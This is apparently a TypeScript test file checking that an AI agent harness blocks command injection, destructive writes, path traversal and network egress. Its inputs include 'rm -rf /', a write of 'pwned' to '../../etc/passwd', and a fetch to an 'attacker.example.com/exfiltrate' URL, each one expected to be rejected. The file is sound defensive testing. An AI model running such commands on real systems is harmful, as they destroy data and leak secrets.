import { describe, expect, it } from "vitest";
import { loadBundle } from "../harness/bundle/loader.js";
import {
  createLocalExecutionEnv,
  EgressNotAllowedError,
  PathTraversalError,
  ReadOnlyViolationError,
  WriteScopeNotGrantedError,
  type ExecCommand,
  type ExecResult,
  type ExecutionEnv,
} from "../harness/exec/index.js";
import { deriveEnforcement } from "../harness/guardrails/index.js";
import { createWrenQueryTool, createWriteArtifactTool } from "../harness/tools/native.js";
import { readFixture } from "./fixtures.js";

/**
 * Permission-enforcement regression (item C, in-process / harness-owned):
 * locks the property that the harness's `ExecutionEnv`/capability gate
 * actually blocks out-of-scope or destructive access, and that the native
 * wren tool only ever runs `wren` — never a command derived from model or
 * user input. These call `ExecutionEnv`/tool `.execute()` directly rather
 * than through `runAgent`'s `ToolLoopAgent` loop: the AI SDK catches a
 * thrown tool error internally and surfaces it as a `tool-error` content
 * part (see `runToolLoopStepWithRepair`'s `stepHasToolError`) instead of
 * rethrowing it through `executeAgent`, so observing the real
 * guard-rejection error requires calling the guarded surface directly —
 * exactly how `test/exec-local.test.ts`, `test/native-write-artifact.test.ts`,
 * and `test/tool-resolution.test.ts` already test these guards.
 *
 * Dispatched's tool allow-list is enforced separately, warble-side, by the
 * Claude Agent SDK's `canUseTool` hook — out of this package's scope and
 * proven there, not here. The CLI-spike workspace-trust gotcha (an
 * interactive `claude` CLI prompting to trust an untrusted directory) does
 * not apply to the SDK path dispatched actually uses (`warble-agent-sdk chat`),
 * which drives the Agent SDK programmatically with no interactive prompt.
 */

function fakeEnv(execImpl: (cmd: ExecCommand) => Promise<ExecResult>): ExecutionEnv {
  return {
    exec: execImpl,
    readFile: () => {
      throw new Error("not used in this test");
    },
    writeFile: () => {
      throw new Error("not used in this test");
    },
    fetch: () => {
      throw new Error("not used in this test");
    },
  };
}

describe("permission enforcement (item C)", () => {
  it("createWrenQueryTool always execs the literal command \"wren\", never a command derived from the sql input", async () => {
    let observed: ExecCommand | undefined;
    const env = fakeEnv(async (cmd) => {
      observed = cmd;
      return { stdout: "", stderr: "", exitCode: 0 };
    });

    const queryTool = createWrenQueryTool({ env, policy: { readOnly: true }, projectDir: "/unused/project" });

    // Even an input crafted to look like a shell-injection or command-swap
    // attempt is passed through as a single opaque `-s` argument — the
    // command name is architecturally hardcoded, never derived from it.
    await queryTool.execute!(
      { sql: "select 1; rm -rf /" },
      { toolCallId: "call-1", messages: [], context: undefined },
    );

    expect(observed?.command).toBe("wren");
    expect(observed?.args).toContain("select 1; rm -rf /");
  });

  it("blocks a destructive write-mode command under a read-only policy with ReadOnlyViolationError", async () => {
    const bundle = loadBundle(readFixture("genbi-default.bundle.json"));
    const agent = bundle.agents.find((candidate) => candidate.id === "answer_query");
    if (!agent) throw new Error("fixture missing answer_query agent");

    // The real fixture's answer_query policy: read_only_execution is
    // locked, so this is the enforcement the harness actually ships, not a
    // synthetic one.
    const policy = deriveEnforcement(agent);
    expect(policy.readOnly).toBe(true);

    const env = createLocalExecutionEnv({ execImpl: async () => ({ stdout: "", stderr: "", exitCode: 0 }) });

    await expect(
      env.exec({ mode: "write", command: "rm", args: ["-rf", "/"] }, policy),
    ).rejects.toThrow(ReadOnlyViolationError);
  });

  it("blocks writing an artifact outside the granted scope with PathTraversalError", async () => {
    const bundle = loadBundle(readFixture("genbi-default.bundle.json"));
    const agent = bundle.agents.find((candidate) => candidate.id === "generate_dashboard");
    if (!agent) throw new Error("fixture missing generate_dashboard agent");

    const policy = deriveEnforcement(agent);
    expect(policy.artifactWriteScope).toBe(".");

    const env = createLocalExecutionEnv({});
    const writeArtifactTool = createWriteArtifactTool(env, policy);

    await expect(
      writeArtifactTool.execute!(
        { path: "../../etc/passwd", content: "pwned" },
        { toolCallId: "call-1", messages: [], context: undefined },
      ),
    ).rejects.toThrow(PathTraversalError);
  });

  it("blocks any artifact write for an agent whose guardrails grant no write scope with WriteScopeNotGrantedError", async () => {
    const bundle = loadBundle(readFixture("genbi-default.bundle.json"));
    const agent = bundle.agents.find((candidate) => candidate.id === "answer_query");
    if (!agent) throw new Error("fixture missing answer_query agent");

    const policy = deriveEnforcement(agent);
    expect(policy.artifactWriteScope).toBeUndefined();

    const env = createLocalExecutionEnv({});
    const writeArtifactTool = createWriteArtifactTool(env, policy);

    await expect(
      writeArtifactTool.execute!(
        { path: "report.md", content: "hello" },
        { toolCallId: "call-1", messages: [], context: undefined },
      ),
    ).rejects.toThrow(WriteScopeNotGrantedError);
  });

  it("blocks egress to a host outside the policy's allowlist with EgressNotAllowedError", async () => {
    const env = createLocalExecutionEnv({
      fetchImpl: async () => ({ status: 200, text: async () => "should not be called" }),
    });

    await expect(
      env.fetch({ url: "https://attacker.example.com/exfiltrate" }, { readOnly: true }),
    ).rejects.toThrow(EgressNotAllowedError);
  });
});
